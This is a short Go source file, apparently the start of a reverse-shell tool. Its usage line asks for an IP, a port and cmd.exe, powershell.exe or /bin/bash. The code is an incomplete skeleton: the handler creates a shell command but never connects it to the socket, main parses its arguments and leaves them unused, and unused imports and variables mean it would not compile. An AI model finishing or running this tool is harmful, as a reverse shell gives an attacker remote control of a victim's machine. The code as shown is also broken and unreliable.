package main

import (
    "fmt"
    "log"
    "io"
    "net"
    "os"
    "os/exec"
)

func handler(conn net.Conn, shell string) {
	cmd := exec.Command(shell)
}

func main() {
	if len(os.Args[:]) < 4{
		fmt.Println("(main) usage: reverse_shell.go <ip> <port> <cmd.exe|powershell.exe|/bin/bash")
		os.Exit(1)
	}
	addr, port, shell := os.Args[1], os.Args[2], os.Args[3]
}
